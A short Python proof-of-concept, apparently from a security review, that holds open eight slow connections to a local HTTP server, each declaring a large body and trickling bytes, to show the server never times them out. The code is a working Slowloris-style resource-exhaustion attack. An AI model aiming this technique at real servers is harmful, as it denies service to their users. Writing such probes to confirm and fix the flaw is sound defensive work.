#!/usr/bin/env python3
"""Slowloris / connection-holding probe.

The handler is a ThreadingHTTPServer with no socket timeout and no cap on the
number of worker threads. `_body()` calls `rfile.read(Content-Length)`, which
blocks until the declared bytes arrive. A client can therefore announce a body
under the 1 MB cap and then trickle it, holding a server thread (and its
partially-read buffer) open indefinitely. This probe opens several such
connections and shows the server keeps waiting instead of timing them out.
"""

from __future__ import annotations

import socket
import time

HOST, PORT = "127.0.0.1", 8765
N_CONNS = 8
HOLD_SECONDS = 8.0


def open_slow_connection() -> socket.socket:
    s = socket.create_connection((HOST, PORT), timeout=5)
    # Announce a body we will never finish sending.
    header = (
        "POST /api/balance HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 900000\r\n"
        "\r\n"
    ).encode()
    s.sendall(header)
    s.sendall(b'{"mode":"quota","counts":{"A":1')  # partial body, never completed
    return s


def main() -> None:
    print(f"opening {N_CONNS} slow connections, each declaring 900000 bytes but "
          f"sending ~30...")
    conns = []
    started = time.perf_counter()
    for i in range(N_CONNS):
        try:
            conns.append(open_slow_connection())
        except OSError as exc:
            print(f"  connection {i} failed: {exc}")

    # While those threads are parked in rfile.read(), confirm the server has NOT
    # closed them and is still parked. We trickle one more byte per second.
    parked = 0
    for tick in range(int(HOLD_SECONDS)):
        alive = 0
        for s in conns:
            try:
                s.sendall(b" ")  # a byte of insignificant whitespace inside JSON string? no: send padding
                alive += 1
            except OSError:
                pass
        parked = alive
        time.sleep(1.0)
        print(f"  t={tick + 1}s: {alive}/{len(conns)} slow connections still accepted by server")

    elapsed = time.perf_counter() - started
    # A concurrent normal request should still work (threaded), but each held
    # connection consumes a dedicated thread + buffer; with no timeout an
    # attacker can accumulate them without bound.
    verdict = "VULN" if parked == len(conns) and parked > 0 else "INCONCLUSIVE"
    print(f"\nheld {parked}/{len(conns)} connections for {elapsed:.1f}s with no "
          f"server-side timeout -> {verdict}")
    print("(handler sets no socket timeout and no max-thread bound; "
          "each parked read holds a thread until the client goes away)")
    for s in conns:
        s.close()


if __name__ == "__main__":
    main()
